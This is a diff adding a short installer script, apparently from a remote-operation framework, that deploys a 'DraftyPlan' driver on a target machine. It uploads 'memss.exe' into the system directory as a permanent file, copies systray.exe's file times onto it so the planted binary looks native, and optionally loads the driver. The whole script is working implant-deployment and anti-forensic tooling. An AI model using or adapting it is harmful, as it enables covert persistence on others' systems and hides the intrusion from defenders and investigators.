@@ -1,0 +1,96 @@
+#--------------------------------------------------------
+# File: Install.eps
+#
+# Wrapper script for Install of DraftyPlan tools
+#
+# Modifications:
+#  11/18/2002	Created.
+#  02/03/2004	Updated to use module calls
+#--------------------------------------------------------
+@include "_DriverIncludes.epm";
+@include "_FileExists.epm";
+@include "_GetSystemPaths.epm";
+
+@echo off;
+
+if (($argc < 2) || ($argc > 4)) {
+    echo "Usage: $argv[0] <driverName> [localExe] [0|1]";
+    return false;
+}
+
+string $driver = $argv[1];
+string $exeName = "memss.exe";
+string $localExe;
+if ($argc >= 3) {
+    $localExe = $argv[2];
+}
+
+bool $load = false;
+if ($argc >= 4) {
+    if (<int>$argv[3] == 1) {
+	$load = true;
+    }
+}
+
+# get the system directory
+string $root;
+string $sys;
+ifnot (_GetSystemPaths($root, $sys)) {
+    echo "Unable to determine root directory\n";
+    return false;
+}
+string $sysDir = "$root\\$sys";
+
+# make sure the exe isn't already installed
+if (_FileExists($exeName, $sysDir)) {
+    echo "$exeName is already installed";
+    return false;
+}
+
+ifnot (defined($localExe)) {
+    # user needs to provide input
+    $localExe = GetInput("Enter the local path to $exeName");
+    ifnot (defined($localExe)) {
+	echo "Invalid path to $exeName";
+	return false;
+    }
+
+    ifnot (prompt "Continue?") {
+	return false;
+    }
+}
+
+# install the driver
+ifnot (_DriverInstall($driver, "DraftyPlan", 2, 1)) {
+    return false;
+}
+
+# upload the executable
+echo "Uploading the EXE";
+if (`put "$localExe" -name "$sysDir\\$exeName" -permanent`) {
+    echo "    SUCCESS";
+} else {
+    echo "    FAILED";
+    return false;
+}
+
+# match file times for exe
+echo "Matching file time for EXE";
+if (`matchtimes "$sysDir\\systray.exe" "$sysDir\\$exeName"`) {
+    echo "    SUCCESS";
+} else {
+    echo "    FAILED (but continuing anyway)";
+}
+
+if ($load) {
+    echo "Loading the driver";
+    if (`driverload -name $driver`) {
+	echo "    PASSED";
+    } else {
+	echo "    FAILED";
+	return false;
+    }
+}
+
+# we're done...
+return true;
